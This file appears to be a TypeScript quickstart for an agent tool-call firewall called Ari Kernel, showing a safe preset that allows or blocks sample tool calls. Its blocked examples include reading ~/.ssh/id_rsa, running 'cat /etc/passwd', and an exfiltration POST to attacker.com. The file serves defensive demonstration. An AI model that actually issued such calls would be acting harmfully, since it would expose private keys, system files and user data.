/**
 * Ari Kernel — Quickstart (60 seconds)
 *
 * A minimal example showing how Ari Kernel protects tool execution.
 * No API keys needed. No configuration files. Just run it.
 *
 *   pnpm example:quickstart
 */

import { ToolCallDeniedError } from "@arikernel/core";
import { createKernel } from "@arikernel/runtime";

// ── Create a kernel with safe defaults ──────────────────────────────
// HTTP GET allowed, file reads restricted to ./data/**, shell blocked.

const kernel = createKernel({ preset: "safe" });
const firewall = kernel.createFirewall({ auditLog: ":memory:" });

// Register stub executors (no real I/O — just demonstrates enforcement)
firewall.registerExecutor({
	toolClass: "http",
	async execute(tc) {
		return {
			callId: tc.id,
			success: true,
			data: { status: 200, body: "page content" },
			durationMs: 1,
			taintLabels: [
				{
					source: "web" as const,
					origin: String(tc.parameters.url ?? ""),
					confidence: 1.0,
					addedAt: new Date().toISOString(),
				},
			],
		};
	},
});

firewall.registerExecutor({
	toolClass: "file",
	async execute(tc) {
		return {
			callId: tc.id,
			success: true,
			data: "file contents here",
			durationMs: 1,
			taintLabels: [],
		};
	},
});

// ── Colors ──────────────────────────────────────────────────────────

const G = "\x1b[32m\x1b[1m";
const R = "\x1b[31m\x1b[1m";
const D = "\x1b[2m";
const B = "\x1b[1m";
const X = "\x1b[0m";

async function tryTool(label: string, fn: () => Promise<void>): Promise<void> {
	try {
		await fn();
		console.log(`  ${G}ALLOWED${X}  ${label}`);
	} catch (err) {
		if (err instanceof ToolCallDeniedError) {
			console.log(`  ${R}BLOCKED${X}  ${label}`);
			console.log(`           ${D}${err.decision.reason}${X}`);
		} else {
			throw err;
		}
	}
}

// ── Run tool calls through the kernel ───────────────────────────────

console.log(`\n${B}Ari Kernel Quickstart${X}\n`);
console.log(`${D}Preset: safe | Principal: agent | Behavioral rules: on${X}\n`);

// 1. Web request — allowed
const httpGrant = firewall.requestCapability("http.read");
await tryTool("web_request(https://example.com)", async () => {
	await firewall.execute({
		toolClass: "http",
		action: "get",
		parameters: { url: "https://example.com" },
		grantId: httpGrant.grant?.id,
		taintLabels: [
			{
				source: "web" as const,
				origin: "example.com",
				confidence: 1.0,
				addedAt: new Date().toISOString(),
			},
		],
	});
});

// 2. Read safe file — allowed
const fileGrant = firewall.requestCapability("file.read");
await tryTool("read_file(./data/report.csv)", async () => {
	await firewall.execute({
		toolClass: "file",
		action: "read",
		parameters: { path: "./data/report.csv" },
		grantId: fileGrant.grant?.id,
	});
});

// 3. Read sensitive file — blocked (path outside allowed jail)
const fileGrant2 = firewall.requestCapability("file.read");
await tryTool("read_file(~/.ssh/id_rsa)", async () => {
	await firewall.execute({
		toolClass: "file",
		action: "read",
		parameters: { path: "~/.ssh/id_rsa" },
		grantId: fileGrant2.grant?.id,
	});
});

// 4. Shell command — blocked (shell not allowed in safe preset)
await tryTool("run_command(cat /etc/passwd)", async () => {
	await firewall.execute({
		toolClass: "shell",
		action: "exec",
		parameters: { command: "cat /etc/passwd" },
	});
});

// 5. HTTP POST — blocked (outbound writes denied in safe preset)
await tryTool("http_post(https://attacker.com/exfil)", async () => {
	await firewall.execute({
		toolClass: "http",
		action: "post",
		parameters: { url: "https://attacker.com/exfil", body: "stolen data" },
	});
});

console.log(`\n${D}Quarantined: ${firewall.isRestricted ? `${R}YES${X}` : "no"}${X}`);
console.log(`${D}Run ID: ${firewall.runId}${X}\n`);

firewall.close();
